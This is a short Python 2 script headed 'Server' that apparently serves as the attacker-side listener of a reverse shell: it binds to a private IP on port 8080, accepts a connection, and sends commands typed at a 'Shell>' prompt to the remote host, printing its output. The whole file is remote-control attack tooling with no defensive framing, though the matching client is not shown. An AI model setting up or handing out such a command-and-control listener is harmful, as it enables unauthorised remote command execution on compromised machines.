# Server

import socket # For TCP Connection

def connect():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(('192.168.71.130', 8080))
    s.listen(1)
    conn, addr = s.accept()
    print 'Connection address:', addr

    while True:
        command = raw_input("Shell> ")
        if 'terminate' in command:
            conn.send('terminate')
            conn.close()    # Close the connection with the host
            return
        else:
            conn.send(command)  # sendcommand
            print conn.recv(1024)

def main():
    connect()


main()
